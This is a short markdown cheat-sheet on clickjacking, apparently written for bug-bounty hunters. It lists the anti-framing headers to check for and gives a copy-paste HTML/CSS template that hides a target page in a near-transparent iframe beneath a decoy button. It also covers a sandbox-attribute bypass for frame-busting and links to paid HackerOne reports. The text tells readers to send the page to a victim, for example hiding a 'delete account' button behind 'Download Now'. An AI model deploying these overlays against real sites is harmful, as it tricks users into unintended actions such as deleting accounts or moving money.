# Clickjacking (UI redressing)

>Clickjacking refers to any attack where the user is tricked into unintentionally clicking an unexpected web page element. The name was coined from click hijacking, and the technique is most often applied to web pages by overlaying malicious content over a trusted page or by placing a transparent page on top of a visible one. When the user clicks an innocent-looking item on the visible page, they are actually clicking the corresponding location on the overlaid page and the click triggers a malicious action – anything from faking a like or follow on social media to siphoning money from the user’s bank account.

![netsparker image](https://dpsvdv74uwwos.cloudfront.net/statics/img/ogimage/clickjacking-attacks.png)

## Summary 
- [Clickjacking (UI redressing)](#clickjacking-ui-redressing)
  - [Summary](#summary)
  - [Check whether a web page can be loaded in iframe](#check-whether-a-web-page-can-be-loaded-in-iframe)
  - [Exploits](#exploits)
  - [Bypass browser extensions](#bypass-browser-extensions)
  - [Hackerone Reports :](#hackerone-reports)
  - [References](#references)

## Check whether a web page can be loaded in iframe

Send a request to the target and make sure that the response doesn't contain one of the following Headers

```bash
 X-Frame-Options: deny
 X-Frame-Options: sameorigin
 X-Frame-Options: allow-from https://specified-websites.com
 Content-Security-Policy: frame-ancestors 'self';
 Content-Security-Policy: frame-ancestors specified-website.com; 
```


## Exploits 

:fire: **Example :**

Copy this to your website

```bash
<style>
   iframe {
       position:relative;
       width:$width_value;
       height: $height_value;
       opacity: $opacity;
       z-index: 2;
   }
   div {
       position:absolute;
       top:$top_value;
       left:$side_value;
       z-index: 1;
   }
</style>
<div>Test me</div>
<iframe src="$url"></iframe>
```

 - `$url` : URL of the malicious Content

 - `$opacity` : Hide the malicious content with `0.0001` value

 - `$width_value` : width value of the malicious content

 - `$height_value` : height value of the malicious content

 - `$top_value` & `$side_value`  are used to move the div in top of the malicious content

**now when the victim click something inside the div in fact he is clicking the malicious content too**

for example : you hide `delete account` button ... and you show `Download Now` button
***

**And you send your website to the victim** 

## Bypass browser extensions

while : `allow-top-navigation` value is omitted

```bash
sandbox="allow-forms"
```
```bash
sandbox="allow-scripts"
```

**Example :**  

```bash
<iframe sandbox="allow-forms" src="$url"></iframe>
```


## Hackerone Reports :

[Twitter Periscope Clickjacking Vulnerability](https://hackerone.com/reports/591432) $1120


[Clickjacking at ylands.com](https://hackerone.com/reports/405342) $80



## References

- [Netsparker](https://www.netsparker.com/blog/web-security/clickjacking-attacks/)
- [Portswigger](https://portswigger.net/web-security/clickjacking)